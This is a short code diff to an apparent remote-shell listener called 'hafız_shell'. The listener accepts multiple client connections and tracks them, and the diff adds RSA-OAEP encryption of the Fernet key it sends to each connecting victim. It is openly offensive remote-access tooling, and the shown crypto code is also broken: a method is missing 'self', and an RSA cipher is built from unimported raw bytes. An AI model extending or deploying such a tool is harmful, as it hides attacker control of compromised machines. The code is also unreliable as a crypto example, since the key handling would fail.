@@ -4,11 +4,19 @@ from cryptography.fernet import Fernet
 import sys
 import os
 import colorama
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA
 class hafız_shell():
     def __init__(self):
         self.id = 1
         self.clients = {}
-
+        self.key=b""
+    def rsa_encrpt(client,key):
+        sifreli=client.recv(2048)
+        cipher=PKCS1_OAEP.new(sifreli)
+        sifreli_key=cipher.encrypt(key)
+        client.sendall(sifreli_key)
+        
     def baglantı_bekle(self, ip, port):
         try:
             server = s.socket(s.AF_INET, s.SOCK_STREAM)
@@ -19,7 +27,7 @@ class hafız_shell():
                 try:
                     conn, adrr = server.accept()
                     key = Fernet.generate_key()
-                    conn.sendall(key)
+                    self.rsa_encrpt(conn,key)
             
                     client = [adrr, key, conn]
                     self.clients[self.id] = client
